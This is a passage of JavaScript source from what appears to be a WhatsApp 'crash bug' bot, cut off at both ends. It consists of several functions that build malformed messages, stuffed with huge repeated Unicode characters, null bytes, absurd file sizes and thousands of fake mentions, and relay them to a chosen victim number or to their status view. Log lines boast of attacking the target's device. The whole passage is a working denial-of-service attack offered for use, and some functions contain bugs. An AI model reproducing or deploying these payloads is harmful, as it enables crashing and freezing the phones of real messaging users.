            text: "HxD - ZiaoXang" + "\uB100".repeat(2000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "𑜦𑜠".repeat(100400),
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "こんにちは",
                  id: "📌",
                }),
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "MasDev",
                  url: "https://t.me/unkwon",
                  merchant_url: "https://t.me/Unkwon",
                }),
              },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                  display_text: null,
                  id: null,
                }),
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "\uB100",
                  id: "message",
                  copy_code: "\n".repeat(20000),
                }),
              },
              {
                name: "cta_reminder",
                buttonParamsJson: JSON.stringify({
                  display_text: null,
                  id: "message",
                }),
              },
              {
                name: "cta_cancel_reminder",
                buttonParamsJson: JSON.stringify({
                  display_text: null,
                  id: "message",
                }),
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "WEBSITE!!!",
                  url: "https://" + "𑜦𑜠".repeat(5000) + ".my.id",
                }),
              },
            ],
          },
        },
      },
    },
  };
  await sock.relayMessage(target, ElHxD.message, { messageId: ElHxD.key?.id });
}

async function LocaCrashUi2(sock, target) {
console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
  const otaxx = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
  locationMessage: {
          degreesLatitude: 11.11,
          degreesLongitude: -11.11,
          name: "DO YOU KNOW ME?¿ OTAX" + "ꦽ".repeat(60000),
          url: "https://t.me/Otapengenkawin",
          contextInfo: {
            externalAdReply: {
              quotedAd: {
                advertiserName: "ꦾ".repeat(60000),
                mediaType: "IMAGE",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                caption: "οταϰ ιѕ нєяє"
              },
              placeholderKey: {
                remoteJid: "0@g.us",
                fromMe: true,
                id: "ABCDEF1234567890"
              }
            }
          }
        },
            hasMediaAttachment: true
          },
          body: {
            text: "нαιι ιм οταϰ⸙"
          },
          nativeFlowMessage: {
            messageParamsJson: "{[",
            messageVersion: 3,
            buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },           
                {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                    "icon": "RIVIEW",
                    "flow_cta": "ꦽ".repeat(10000),
                    "flow_message_version": "3"
                })
              },      
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                    "icon": "RIVIEW",
                    "flow_cta": "ꦾ".repeat(10000),
                    "flow_message_version": "3"
                })
              },  
            ]
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, proto.Message.fromObject(otaxx), { userJid: target });
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
  
  await new Promise(r => setTimeout(r, 500));

  await sock.sendMessage(target, {
    delete: {
      fromMe: true,
      remoteJid: target,
      id: msg.key.id
    }
  });
}

async function TrueNull(sock, target) {
  const module = {
    message: {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 999999999999999999,
            seconds: 9999999999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "13300350@s.whatsapp.net",
                target,
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                serverMessageId: 1,
                newsletterName: "X"
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    }
  };

  const Content = generateWAMessageFromContent(
    target,
    module.message,
    { userJid: target }
  );

  await sock.relayMessage("status@broadcast", Content.message, {
    messageId: Content.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target } }
            ]
          }
        ]
      }
    ]
  });
  const viewOnceMsg = generateWAMessageFromContent(
  "status@broadcast",
  {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "X",
            format: "BOLD"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          }
        }
      }
    }
  },
  {}
);
await sock.relayMessage(
  "status@broadcast",
  viewOnceMsg.message,
  {
    messageId: viewOnceMsg.key.id,
    statusJidList: [target]
  }
);
console.log(chalk.red(`Succes Send ${target}`));
}

async function StickersAbim(target) {
  try {
    const abimsalsa = "\u2063".repeat(5000);
    const salsa = "\u300B".repeat(3000);

    const msg1 = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "ABIM - ANTI GEDOR",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(25900),
              version: 3
            }
          }
        }
      }
    };

    const msg2 = {  
      stickerMessage: {  
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",  
        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",  
        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",  
        mimetype: "image/webp",  
        height: 9999,  
        width: 9999,  
        directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
        fileLength: 12260,  
        mediaKeyTimestamp: "1743832131",  
        isAnimated: false,  
        stickerSentTs: "X",  
        isAvatar: false,  
        isAiSticker: false,  
        isLottie: false,  
        contextInfo: {  
          mentionedJid: [
            "0@s.whatsapp.net",  
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
            )  
          ],
          stanzaId: "1234567890ABCDEF",
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            }
          }
        }
      }
    };

    const msg3 = {  
      viewOnceMessage: {  
        message: {  
          interactiveMessage: {  
            body: {  
              xternalAdReply: {  
                title: "Abimofficial",  
                text: abimsalsa  
              }  
            },  
            extendedTextMessage: {  
              text: "{".repeat(9000),  
              contextInfo: {  
                mentionedJid: Array.from(
                  { length: 2000 },
                  (_, i) => `1${i}@s.whatsapp.net`
                )
              }  
            },  
            businessMessageForwardInfo: {  
              businessOwnerJid: "13135550002@s.whatsapp.net"  
            },  
            nativeFlowMessage: {  
              buttons: [  
                { name: "view_product", buttonParamsJson: "\u0005".repeat(5000) + salsa },  
                { name: "address_message", buttonParamsJson: "\u0005".repeat(5000) + salsa },  
                { name: "galaxy_message", buttonParamsJson: "\u0005".repeat(6000) + salsa },  
                { name: "cta_url", buttonParamsJson: "\u0005".repeat(5000) + salsa },  
                { name: "call_permission_request", buttonParamsJson: "\u0005".repeat(6000) + salsa },  
                { name: "single_select", buttonParamsJson: "\u0005".repeat(5000) + salsa },  
                { name: "cta_copy", buttonParamsJson: "\u0003".repeat(4000) + salsa }  
              ],  
              nativeFlowResponseMessage: {  
                name: "galaxy_message",  
                paramsJson: "\u0000".repeat(10),  
                version: 3  
              },  
              contextInfo: {  
                mentionedJid: [  
                  "0@s.whatsapp.net",  
                  ...Array.from(
                    { length: 1900 },
                    () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
                  )  
                ]  
              }  
            }  
          }  
        }  
      }  
    };

    for (const msg of [msg1, msg2, msg3]) {  
      await sock.relayMessage("status@broadcast", msg, {  
        messageId: undefined,  
        statusJidList: [target],  
        additionalNodes: [  
          {  
            tag: "meta",  
            attrs: {},  
            content: [  
              {  
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
              }  
            ]  
          }  
        ]  
      });  

      console.log(`Wolker Attacked Your Devices 🤍 Sending Bug To ${target} suksesfull`);  
    }

  } catch (e) {
    console.error(e);
  }
}

async function EvoblankFc(target) {
 const Msg1 = {
  interactiveMessage: {
     contextInfo: {
          stanzaId: "Evoblank.id" + Date.now(),
                isForwarding: true,
                   forwardingScore: 999,
                     participant: target,
                        remoteJid: "status@broadcast",
                        mentionedJid: [
                          "13333335502@s.whatsapp.net",
                            ...Array.from(
                            { length: 5 }, () => 
                        "1" + Math.floor(Math.random() * 5000000) + "13333335502@s.whatsapp.net",
                            ),
                        ],
                        quotedMessage: {
                            paymentInviteMessage: {
                                serviceType: 3,
                                expiryTimeStamp: Date.now() + 18144000000,
                            },
                        },
                        forwardedAiBotMessageInfo: {
                            botName: "META AI",
                            botJid: Math.floor(Math.random() * 99999),
                            creatorName: "Evo engine",
                        },
                   hasMediaAttachment: false
               },
           },
     viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 111111111111,
          degreesLongitude: -111111111111,
          name: "Thun blank + Fc".repeat(1500),
          address: "#Thun blank + Fc".repeat(1000),
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, () =>
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: target,
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  };
  await sock.relayMessage(target, {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "./sock.js" + "𑜦𑜠".repeat(25000),
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: false,
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: "^𝗘𝘃𝗼 𝗘𝗻𝗴𝗶𝗻𝗲" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  "icon": "REVIEW",
                  "flow_cta": "𑜦𑜠".repeat(25000),
                  "flow_message_version": "3"
                })
              }
            ],
            messageParamsJson: "{",
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, () =>
              "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
            ),
            forwardingScore: 999,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: " X ",
            stanzaId: "666",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            }
          },
        },
      },
    },
  }, {
    participant: {
      jid: target
    }
  });
}

async function RexusDelayMess(target, Ptcp = true) {
      await sock.relayMessage(tatget, {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞.𝐜𝐨𝐦",
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: ""
                },
                hasMediaAttachment: true
              },
              body: {
                text: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞.𝐜𝐨𝐦\n" + "@15056662003".repeat(17000)
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "cta_url",
                  buttonParamsJson: "{ display_text: 'Iqbhalkeifer', url: \"https://youtube.com/@iqbhalkeifer25\", merchant_url: \"https://youtube.com/@iqbhalkeifer25\" }"
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }],
                messageParamsJson: "{}"
              },
              contextInfo: {
                mentionedJid: ["15056662003@s.whatsapp.net", ...Array.from({
                  length: 30000
                }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                forwardingScore: 1,
                isForwarded: true,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    fileName: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞 𝐯𝐬 𝐄𝐯𝐞𝐫𝐲𝐛𝐨𝐝𝐲",
                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1724474503",
                    contactVcard: true,
                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ""
                  }
                }
              }
            }
          }
        }
      }, Ptcp ? {
        participant: {
          jid: target
        }
      } : {});
    }

async function YxGZnxx(sock, target) {
 const msg = await generateWAMessageFromContent(target, {
     viewOnceMessage: {
       message: {
        interactiveMessage: {
         header: {
          title: "𝐙𝐍𝐗─𝟓𝟔 : 𝐈𝐒 𝐇𝐄𝐑𝐄 𝐅𝐎𝐑 𝐘𝐎𝐔",
            hasMediaAttachment: false
               },
                body: {
                text: " 𝐙𝐍𝐗─𝟓𝟔 : 𝐚𝐫𝐞𝐚 𝟗𝟖𝟗ꪰ" + "ꦾ".repeat(8000),
                },
                 nativeFlowMessage: {
                 messageParamsJson: "",
                 buttons: [{
                 name: "cta_url",
                 buttonParamsJson: "𝐙𝐍𝐗─𝟓𝟔 : 𝐘𝐱𝐆ꪸꪰ"
                 },
                {
                 name: "call_permission_request",
                buttonParamsJson: " 𝐅𝐎𝐘𝐍𝐃𝐄𝐑 𝐙𝐍𝐗 : 𝐆𝐀𝐑𝐗ꪰ"
                  }
                ]
              }
            }
         }
      }
   }, {});            
   const Garx = {
     viewOnceMessage: {
       message: {
       interactiveMessage: {
         header: {
           title: "𝐘𝐱𝐆- 𝐈𝐧𝐟𝐦",
           subtitle: "𝐙𝐍𝐗─𝟓𝟔 : 𝐢𝐧𝐟𝐦",
            locationMessage: {
            degreesLatitude: 0,
              degreesLongitude: 0,
              name: "\u200D".repeat(5000),
              address: "\u0003".repeat(3000)
                },
               hasMediaAttachment: true,
              },
               body: {
              text: "𝐙𝐍𝐗─𝟓𝟔 : 𝐋𝐎𝐒𝐓 𝐎𝐅𝐅 𝐀𝐍𝐆𝐄𝐋𝐄𝐒" + `_*~@2~*_\n`.repeat(7000) + "ꦽ".repeat(6000),
                        },
               footer: {
               text: "𝐙𝐍𝐗─𝟗𝟗 : 𝐈𝐅 𝐘𝐎𝐔 𝐖𝐀𝐍𝐓 𝐁𝐑𝐄𝐀𝐊".repeat(1500)
                 },
                        nativeFlowMessage: {
                            buttons: [{
                                name: "call_permission_request",
                                buttonParamsJson: ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𝐙𝐍𝐗─𝟓𝟔 : 𝐚𝐫𝐞𝐚 𝐛𝐥𝐮𝐞"
                            }, {
                                name: "cta_url",
                                buttonParamsJson: "𝐙𝐍𝐗─𝟓𝟔 : 𝐫𝐞𝐝 𝐳𝐨𝐧𝐞" + "𝐙𝐍𝐗─𝟓𝟔 : 𝐕𝐒 𝐌𝐀𝐑𝐊"
                            }],
                        },
                        contextInfo: {
                            stanzaId: "Znx-56area",
                            forwardingScore: 9174,
                            isForwarding: true,
                            participant: target,
                            mentionedJid: [
                                ...Array.from({ length:5 }, () => "1@newsletter")
                            ],
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "GarxXX" }],
                            quotedMessage: {
                           interactiveResponseMessage: {
                              body: {
                              text: "ꦾ".repeat(9000),
                              format: "DEFAULT"
                              },
                               nativeFlowResponseMessage: {
                                  name: "galaxy_message",
                                    paramsJson: JSON.stringify({
                                    header: "📢",
                                    body: "🩸",
                                    flow_action: "navigate",
                                   flow_action_payload: { screen: "FORM_SCREEN" },
                                   flow_cta: "Grattler",
                                   flow_id: "1169834181134583",
                                   flow_message_version: "3",
                                flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                                 }),
                               version: 3,
                             },
                          },
                       },
                    },
                },
            },
         },
      };
   const BlankMsg2 = {
    extendedTextMessage: {
      title: "ꦾ".repeat(100000),
      text: "ꦾ".repeat(50000),
      contextInfo: {
        mentionedJid: Array.from(
          { length: 2000 },
          (_, i) => `1${i}@s.whatsapp.net`
        ),
        participant: target,
        stanzaId: "ID-X",
        remoteJid: target,
        isForwarded: true,
        forwardingScore: 999,
        quotedMessage: {
          interactiveMessage: {
            header: {
              title: "YxG - III",
              subtitle: "ꦾ".repeat(10000),
              hasMediaAttachment: false,
            },
            body: {
              text: "ꦾ".repeat(20000),
            },
            footer: {
              text: "ꦾ".repeat(20000),
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    title: "ꦾ".repeat(20000),
                    sections: [
                      {
                        title: "ꦾ".repeat(5000),
                        rows: [
                          {
                            title: "ꦾ".repeat(5000),
                            description: "ꦾ".repeat(5000),
                            id: "ꦾ".repeat(2000),
                          },
                          {
                            title: "ꦾ".repeat(5000),
                            description: "ꦾ".repeat(5000),
                            id: "ꦾ".repeat(2000),
                          },
                          {
                            title: "ꦾ".repeat(5000),
                            description: "ꦾ".repeat(5000),
                            id: "ꦾ".repeat(2000),
                          },
                        ],
                      },
                      {
                        title: "ꦾ".repeat(20000),
                        rows: [
                          {
                            title: "ꦾ".repeat(5000),
                            description: "ꦾ".repeat(5000),
                            id: "ꦾ".repeat(2000),
                          },
                          {
                            title: "ꦾ".repeat(5000),
                            description: "\u0000".repeat(5000),
                            id: "ꦾ".repeat(2000),
                          },
                        ],
                      },
                    ],
                  }),
                },
              ],
            },
          },
        },
      },
    },
  };
  await sock.relayMessage(target, BlankMsg2, {
    messageId: null,
    participant: { jid: target }
  });
  await sock.relayMessage(target, Garx, {
    messageId: null,
    participant: { jid: target }
  });
  await sock.relayMessage(target, msg, {
    messageId: null,
    participant: { jid: target }
  });
  console.log(chalk.red(`𝐙𝐍𝐗─𝟓𝟔 : 𝐀𝐓𝐓𝐀𝐂𝐊𝐄𝐃 𝐑𝐄𝐃 𝐙𝐎𝐍𝐄 𝐓𝐎 ${target} 𝐖𝐀𝐈𝐓`));
}
 
async function VxGLegends(sock, target) {
  try {
    const interactive = {
      limited_time_offer: {
        text: "⸙" + "ꦾ".repeat(2000),
        url: "http://" + "ꦽ".repeat(3000),
        copy_code: "ꦾ".repeat(3000),
        expiration_time: 999999999
      },

      bottom_sheet: {
        in_thread_buttons_limit: 100,
        divider_indices: [1, 2, 3, 4, 5, 999],
        list_title: "✧S A R Z Z X G A R X",
        button_title: "ꦽ".repeat(2000)
      },

      row_list: {
        sections: [
          {
            title: "Section 1",
            rows: Array.from({ length: 30 }, (_, i) => ({
              title: "Row " + i,
              description: "ꦽ".repeat(2000),
              id: "row_" + i
            }))
          }
        ]
      },

      single_select: {
        title: "Single Select",
        options: ["ꦾ".repeat(2000), "ꦽ".repeat(2000), "ោ៝".repeat(2000)]
      },

      multi_select: {
        title: "Multi Select",
        options: ["ꦾ".repeat(2000), "ꦽ".repeat(2000), "ោ៝".repeat(2000)]
      },

      dropdown: {
        title: "Dropdown Title",
        items: ["ꦾ".repeat(2000), "ꦽ".repeat(2000), "ោ៝".repeat(2000)]
      },

      tabbed_list: {
        tabs: ["ꦾ".repeat(2000), "ꦽ".repeat(2000), "ោ៝".repeat(2000)]
      },

      form_input_text: { label: "Name", placeholder: "Enter name" },
      form_input_number: { label: "ꦽ".repeat(2000), placeholder: "ꦾ".repeat(2000) },
      form_input_email: { label: "ោ៝".repeat(2000) },
      form_input_phone: { label: "ꦽ".repeat(2000) },
      form_input_date: { label: "ꦽ".repeat(2000) },
      form_input_time: { label: "ꦽ".repeat(2000) },
      form_input_address: { label: "ꦽ".repeat(2000) },

      form_checkbox: {
        label: "I Agree",
        value: false
      },

      form_radio: {
        label: "Choose",
        items: ["ꦾ".repeat(2000), "ꦽ".repeat(2000), "ោ៝".repeat(2000)]
      },

      form_section_header: {
        text: "Form Section Header"
      },

      form_submit_button: {
        text: "Submit"
      },

      order_id: "X123",
      items: ["ꦾ".repeat(2000), "ꦽ".repeat(2000), "ោ៝".repeat(2000)],

      payment_info: {
        status: "PAID",
        amount: "999999"
      },

      product_list: {
        products: ["ꦾ".repeat(2000), "ꦽ".repeat(2000), "ោ៝".repeat(2000)]
      },

      address_message: {
        address: "Unknown Street"
      },

      shipment_details: {
        status: "Delivered"
      },

      catalog_message: {
        catalog_id: "CATA0001"
      },

      rating_stars: {
        rating: 5
      },

      receipt_info: {
        info: "Receipt Data"
      },

      image_banner: {
        banner_id: "banner_01"
      },

      carousel: {
        items: ["ꦾ".repeat(2000), "ꦽ".repeat(2000), "ោ៝".repeat(2000)]
      },

      product_carousel: {
        items: ["ꦾ".repeat(2000), "ꦽ".repeat(2000), "ោ៝".repeat(2000)]
      },

      video_card: {
        video_url: "https://example.com/vid.mp4"
      },

      identity_permission_request: {
        text: "✧V X G 𝗙𝗨𝗟𝗟 𝗠𝗢𝗗𝗘"
      },

      otp_request: {
        text: "✧V X G 𝗙𝗨𝗟𝗟 𝗠𝗢𝗗𝗘"
      },

      email_verification: {
        text: "✧V X G 𝗙𝗨𝗟𝗟 𝗠𝗢𝗗𝗘"
      },

      phone_verification: {
        text: "V X G 𝗙𝗨𝗟𝗟 𝗠𝗢𝗗𝗘"
      },

      poll: {
        question: "Want Die?",
        options: ["Yes", "No"]
      },

      community_invite: {
        community_id: "COMMUNITY"
      },

      group_suggestion: {
        groups: ["ꦾ".repeat(2000), "ꦽ".repeat(2000), "ោ៝".repeat(2000)]
      },

      native_link_preview: {
        url: "https://example.com"
      },

      address_selector: {
        text: "Select Address"
      },

      delivery_slot_picker: {
        slots: ["ꦾ".repeat(2000), "ꦽ".repeat(2000), "ោ៝".repeat(2000)]
      },

      flow_redirect: {
        target: "another_flow"
      },

      order_cart: {
        items: ["ꦾ".repeat(2000), "ꦽ".repeat(2000), "ោ៝".repeat(2000)]
      },

      inline_map: {
        coords: "0,0"
      }
    };

    interactive = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            title: crash,
            footer: "✧SARZZ X GARX 𝗙𝗨𝗟𝗟 𝗠𝗢𝗗𝗘",
            thumbnail: null,
            nativeFlowMessage: {
              messageParamsJson: JSON.stringify(nativeParams),
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "ꦿ".repeat(3000),
                    url: "https://t.me/SarzzKyowo"
                  })
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    display_text: "ꦿ".repeat(2000),
                    copy_code: "ꦾ".repeat(2000)
                  })
                },
                {
                  name: "cta_call",
                  buttonParamsJson: JSON.stringify({
                    display_text: "CALL",
                    phone_number: "+62800000000"
                  })
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "Request Camera",
                    id: "camera_permission_request"
                  })
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "Request Identity",
                    id: "identity_permission_request"
                  })
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: JSON.stringify({
                    display_text: "Form Submit",
                    id: "form_submit"
                  })
                }
              ]
            }
          }
        }
      }
    };

    await sock.relayMessage(target, interactive);
    console.log("BUG ANDROID BERHASIL TERKIRIM!");
  } catch (err) {
    console.error("ERR JIR:", err);
  }
}

async function RFPTarsax(target) {
  const RequestanJamz = { 
   viewOnceMessage: { 
      message: { 
         interactiveMessage: { 
           body: { 
             text: "Maklu" + "ꦽ".repeat(40000),
           },
           messageContextInfo: { 
             deviceListMetadata: {}, 
             deviceListMetadataVersion: 2,
           },
           locationMessage: { 
             degressLatitude: -2, 
             degressLongitude: 2,
           },
           nativeFlowMessage: { 
              messageParamsJson: "{[".repeat(5000), 
                 buttons: [
                   {
                     name: "send_location",
                     buttonParamsJson: JSON.stringify({ 
                       display_text: "ꦽ".repeat(5000),
                     }),
                   },
                 ],
                 quotedMessage: { 
                   paymentInviteMessage: {
                     serviceType: 82937,
                   },
                },
             },
          },
       },
    },
 }; 
 
  await sock.relayMessage("status@broadcast", RequestanJamz.message, {
        messageId: RequestanJamz.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
    
    const JamzRequest = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "ꦾ".repeat(20000),
            locationMessage: {
              degreesLatitude: 0,
              degreesLongitude: 0,
              name: "ꦾ".repeat(20000),
              address: "ꦾ".repeat(20000)
            },
            hasMediaAttachment: true
          },
          body: {
            text: "ꦾ".repeat(20000)
          },
          footer: {
            text: "ꦾ".repeat(20000)
          },
          nativeFlowMessage: {
            name: "ꦾ".repeat(20000),
            messageParamsJson: "ꦾ".repeat(20000)
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 2000 }, (_, z) => 
              `1${3000000000 + z}@s.whatsapp.net`
            ),
            stanzaId: "ꦾ".repeat(5000),
            participant: target,
            isForwarded: true,
            forwardingScore: 99999
          }
        }
      }
    }
  };
  
  await sock.relayMessage("status@broadcast", JamzRequest.message, {
        messageId: JamzRequest.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
